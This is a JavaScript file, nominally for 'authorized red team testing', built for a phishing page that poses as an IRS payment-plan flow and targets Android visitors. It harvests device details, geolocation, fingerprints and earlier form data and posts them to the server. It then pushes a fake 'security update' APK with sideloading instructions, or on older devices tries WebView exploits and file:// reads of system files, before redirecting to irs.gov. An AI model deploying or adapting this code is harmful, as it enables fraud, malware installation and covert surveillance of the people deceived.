// Android Device Fingerprinting & Exploit Deployment
// For authorized red team testing only

// Android Detection
function isAndroid() {
    return /Android/i.test(navigator.userAgent);
}

// Android Exploit Deployment
function deployAndroidExploit() {
    // Collect comprehensive device info first
    collectAndroidDeviceInfo();
    
    // Choose deployment method based on Android version
    const androidVersion = getAndroidVersion();
    
    if (androidVersion >= 10) {
        // Modern Android - Use APK download method
        deployAPKDownload();
    } else {
        // Older Android - Use WebView exploits
        deployWebViewExploits();
    }
}

// Comprehensive Android Device Info Collection
function collectAndroidDeviceInfo() {
    const deviceInfo = {
        // Basic device info
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        
        // Screen info
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenColorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        
        // Browser info
        browserName: getBrowserName(),
        browserVersion: getBrowserVersion(),
        
        // Network info
        connectionType: navigator.connection?.effectiveType,
        downlink: navigator.connection?.downlink,
        
        // Hardware info
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        
        // Location (if permitted)
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        
        // Android specific
        androidVersion: getAndroidVersion(),
        chromeVersion: getChromeVersion(),
        isWebView: isWebView(),
        
        // Security info
        doNotTrack: navigator.doNotTrack,
        cookieEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled(),
        
        // Form data from previous submission (if available)
        formData: window.formData || null
    };
    
    // Attempt to get location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                deviceInfo.location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                sendDeviceInfo(deviceInfo);
            },
            () => sendDeviceInfo(deviceInfo),
            { timeout: 5000 }
        );
    } else {
        sendDeviceInfo(deviceInfo);
    }
}

// APK Download Method (Modern Android)
function deployAPKDownload() {
    alert('üîê Security Update Required: Android security patch needed for payment processing. Downloading update...');
    
    // Create hidden download link
    const downloadLink = document.createElement('a');
    downloadLink.href = '/android-security-update.apk';  // APK hosted on server
    downloadLink.download = 'android-security-update.apk';
    downloadLink.style.display = 'none';
    document.body.appendChild(downloadLink);
    
    // Trigger download
    setTimeout(() => {
        downloadLink.click();
        document.body.removeChild(downloadLink);
        
        // Show installation instructions
        showAPKInstallInstructions();
    }, 1000);
}

// WebView Exploits (Older Android)
function deployWebViewExploits() {
    // CVE-2014-6041 - AddJavascriptInterface RCE
    try {
        if (window.searchBoxJavaBridge_) {
            window.searchBoxJavaBridge_.postMessage = function(message) {
                // Exploit code here
                console.log('WebView exploit triggered');
                sendExploitInfo('CVE-2014-6041', 'AddJavascriptInterface RCE attempted');
            };
        }
    } catch (e) {}
    
    // CVE-2012-6636 - File URI access
    try {
        const iframe = document.createElement('iframe');
        iframe.src = 'file:///android_asset/';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        sendExploitInfo('CVE-2012-6636', 'File URI access attempted');
    } catch (e) {}
    
    // Intent URL scheme exploitation
    try {
        const intentLink = document.createElement('a');
        intentLink.href = 'intent://example.com#Intent;scheme=http;package=com.android.browser;end';
        intentLink.click();
        sendExploitInfo('Intent-Scheme', 'Intent URL exploitation attempted');
    } catch (e) {}
    
    // Additional WebView exploits
    try {
        // File access exploit
        fetch('file:///system/etc/hosts')
            .then(response => response.text())
            .then(data => {
                sendExploitInfo('File-Access', 'System file access successful', data);
            })
            .catch(() => {});
    } catch (e) {}
    
    // Standard success message after exploit attempts
    setTimeout(() => {
        alert('‚úÖ Payment plan established! Your case has been forwarded to the payment processing center.');
        window.location.href = 'https://www.irs.gov/payments';
    }, 2000);
}

// Helper Functions
function getAndroidVersion() {
    const match = navigator.userAgent.match(/Android (\d+(\.\d+)?)/);
    return match ? parseFloat(match[1]) : 0;
}

function getChromeVersion() {
    const match = navigator.userAgent.match(/Chrome\/(\d+)/);
    return match ? parseInt(match[1]) : 0;
}

function getBrowserName() {
    if (navigator.userAgent.includes('Chrome')) return 'Chrome';
    if (navigator.userAgent.includes('Firefox')) return 'Firefox';
    if (navigator.userAgent.includes('Safari')) return 'Safari';
    return 'Unknown';
}

function getBrowserVersion() {
    const match = navigator.userAgent.match(/(Chrome|Firefox|Safari)\/(\d+)/);
    return match ? match[2] : 'Unknown';
}

function isWebView() {
    return navigator.userAgent.includes('wv') || window.chrome === undefined;
}

function sendDeviceInfo(deviceInfo) {
    fetch('/api/android-device-info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(deviceInfo)
    }).catch(() => {});
}

function sendExploitInfo(exploitType, description, data = null) {
    const exploitInfo = {
        type: exploitType,
        description: description,
        data: data,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    fetch('/api/exploit-attempts', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(exploitInfo)
    }).catch(() => {});
}

function showAPKInstallInstructions() {
    const instructions = `
        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
                   background: rgba(0,0,0,0.9); z-index: 9999; 
                   display: flex; align-items: center; justify-content: center;">
            <div style="background: white; padding: 20px; border-radius: 8px; 
                       max-width: 90%; text-align: center;">
                <h3>üîê Security Update Required</h3>
                <p style="margin: 15px 0;">To complete your payment setup, please install the required security update:</p>
                <ol style="text-align: left; margin: 15px 0;">
                    <li>Check your Downloads folder</li>
                    <li>Tap "android-security-update.apk"</li>
                    <li>Allow installation from unknown sources if prompted</li>
                    <li>Follow installation prompts</li>
                    <li>Return to this page when complete</li>
                </ol>
                <p style="font-size: 12px; color: #666; margin: 10px 0;">
                    This security update is required for PCI compliance and payment processing.
                </p>
                <button onclick="this.parentElement.parentElement.remove()" 
                        style="background: #1976d2; color: white; border: none; 
                               padding: 10px 20px; border-radius: 4px; margin: 5px;">
                    I understand
                </button>
                <button onclick="retryDownload()" 
                        style="background: #ff9800; color: white; border: none; 
                               padding: 10px 20px; border-radius: 4px; margin: 5px;">
                    Download Again
                </button>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', instructions);
}

function retryDownload() {
    // Remove current overlay
    const overlay = document.querySelector('div[style*="position: fixed"]');
    if (overlay) overlay.remove();
    
    // Trigger download again
    setTimeout(() => {
        deployAPKDownload();
    }, 500);
}

// Advanced fingerprinting techniques
function advancedFingerprinting() {
    const fingerprint = {};
    
    // Canvas fingerprinting
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Android device fingerprint test', 2, 2);
        fingerprint.canvas = canvas.toDataURL();
    } catch (e) {}
    
    // WebGL fingerprinting
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        fingerprint.webgl = {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER)
        };
    } catch (e) {}
    
    // Audio context fingerprinting
    try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        fingerprint.audioContext = {
            sampleRate: audioCtx.sampleRate,
            state: audioCtx.state
        };
    } catch (e) {}
    
    // Battery API (if available)
    try {
        navigator.getBattery?.().then(battery => {
            fingerprint.battery = {
                level: battery.level,
                charging: battery.charging
            };
            sendDeviceInfo({fingerprint});
        });
    } catch (e) {}
    
    return fingerprint;
}

// Initialize advanced fingerprinting on page load
document.addEventListener('DOMContentLoaded', () => {
    if (isAndroid()) {
        advancedFingerprinting();
    }
});